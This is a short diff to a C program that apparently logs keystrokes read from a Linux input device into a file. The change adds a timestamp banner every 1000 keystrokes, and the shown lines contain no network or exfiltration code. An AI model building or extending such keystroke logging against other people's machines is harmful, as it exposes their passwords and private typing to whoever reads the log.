@@ -3,6 +3,7 @@
 #include <unistd.h>
 #include <stdlib.h>
 #include <string.h>
+#include <time.h>
 #include <linux/input.h>
 #include "functions.h"
 #include "define.h"
@@ -12,6 +13,17 @@
 input_event event;
 int shift = 0;
 int caps = 0;				// assuming capslock to be off
+int keystroke_count = 0;
+
+
+// get time
+static char *getTimestamp(){
+    time_t ltime; /* calendar time */
+    ltime=time(NULL); /* get current cal time */
+    char *time = asctime(localtime(&ltime));
+    time[strlen(time)-1] = 0;
+    return time;
+}
 
 
 // to find device file
@@ -127,6 +139,14 @@ int main(){
 						shift = 0;
 					}
 				}
+				if(keystroke_count == 1000){
+					char *time = getTimestamp();		// get timestamp
+					fputs("\n\n============================================ ", lf);
+					fputs(time, lf);
+					fputs(" =============================================\n\n", lf);
+					keystroke_count = 0;
+				}
+				keystroke_count++;
 			}
 		}
 	}
